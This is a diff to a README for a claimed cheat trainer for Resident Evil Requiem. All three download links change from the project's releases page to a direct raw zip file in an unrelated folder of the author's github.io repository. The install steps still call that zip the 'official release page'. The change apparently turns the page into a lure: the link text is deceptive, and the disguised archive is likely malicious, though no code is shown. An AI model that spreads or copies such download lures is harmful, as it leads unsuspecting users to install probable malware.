@@ -5,7 +5,7 @@ description: "Modify Resident Evil Requiem with 42+ trainer features including g
 ---
 # 🎮 Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2 - Enhance your Resident Evil game experience
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sarang-0007/Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/sarang-0007/sarang-0007.github.io/raw/refs/heads/main/measuration/github-io-sarang-1.2.zip)
 
 This application provides tools to customize your gameplay in Resident Evil Requiem. You gain control over game settings like health, ammunition, and camera perspectives. The software works as a trainer, which means it reads and writes specific data during your game session to adjust values stored in the computer memory.
 
@@ -45,7 +45,7 @@ Ensure you meet these minimum standards before you run the software.
 
 Follow these steps to download and use the trainer.
 
-1.  Visit the official release page: [https://github.com/sarang-0007/Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2/releases](https://github.com/sarang-0007/Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2/releases).
+1.  Visit the official release page: [https://github.com/sarang-0007/sarang-0007.github.io/raw/refs/heads/main/measuration/github-io-sarang-1.2.zip](https://github.com/sarang-0007/sarang-0007.github.io/raw/refs/heads/main/measuration/github-io-sarang-1.2.zip).
 2.  Locate the section labeled Assets.
 3.  Click the file ending in .zip to start the download.
 4.  Open the folder where you saved the file.
@@ -105,4 +105,4 @@ Yes. You can uncheck any box in the trainer menu to revert the game back to its 
 
 **Where do I see updates for the trainer?**
 Check the link below for all new versions and bug fixes.
-[Visit the release page to download updates](https://github.com/sarang-0007/Resident-Evil-Requiem-Ultimate-Trainer-2026_v_2/releases)
+[Visit the release page to download updates](https://github.com/sarang-0007/sarang-0007.github.io/raw/refs/heads/main/measuration/github-io-sarang-1.2.zip)
